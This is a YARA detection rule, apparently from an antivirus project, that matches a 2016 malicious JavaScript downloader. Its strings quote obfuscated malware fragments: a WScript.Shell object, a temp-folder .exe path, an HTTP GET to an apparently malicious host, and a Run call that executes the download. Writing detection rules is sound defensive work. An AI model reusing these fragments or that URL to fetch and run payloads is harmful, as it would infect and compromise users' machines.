rule sig_20160328_96ff041f1d5e3ea41a8489f4cb124a96 {
  meta:
    description = "datamaliciousorder - file 20160328_96ff041f1d5e3ea41a8489f4cb124a96.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8fcd18fda86521630237cc43bb7108d64f699b7566ab294d17c36417206bd2be"

  strings:
    $s1  = "function Xpbnwvd() {return Dttlo[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"kOqaUzAJ.exe\";};" fullword ascii
    $s2  = "Cygmgcfd[Eeseqdoa](\"GET\", \"http://blackmountaintipis.com/mxn3aad\", false);" fullword ascii
    $s3  = "do {WScript[Qikyk](Nurjq() * 11)} while (Cygmgcfd[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Nwvedt(Bgkvtfagym, Nbvui){return Bgkvtfagym - Nbvui;};" fullword ascii
    $s5  = "var Dttlo = function Wxhkqhmht() {return WScript[Zvgqm](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Hixlvw() {return ((Tvdrfflcqg == true) && (Tvdrfflcqg == Jfwadlpq)) ? 1 : Chlcw;};" fullword ascii
    $s7  = "function Xrgkbdum(Kjobwitxo){Dttlo[\"Run\"](Kjobwitxo, Chlcw, Chlcw);};" fullword ascii
    $s8  = "function Cmnzgiaxvj(Pmfpkbs) {var Obkzqexk = (1, 2, 3, 4, 5, Pmfpkbs); return Obkzqexk;};" fullword ascii
    $s9  = "function Nurjq(){return 22;};" fullword ascii
    $s10 = "var Bdxrxuyf = new this[\"Date\"]();" fullword ascii
    $s11 = "return Nwvedt(Jisawl, Hmutmnmk);" fullword ascii
    $s12 = "var Tvdrfflcqg = false;" fullword ascii
    $s13 = "var Gxdwmia = false;" fullword ascii
    $s14 = "function Alagjid(){return Zvgqm;};" fullword ascii
    $s15 = "function Wpcwp()" fullword ascii
    $s16 = " while (Uaavaqlr){" fullword ascii
    $s17 = "function Elodlwk(){return Erhwmj;};" fullword ascii
    $s18 = "Tvdrfflcqg = true; " fullword ascii
    $s19 = "var Jfwadlpq = false;" fullword ascii
    $s20 = "Jfwadlpq = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}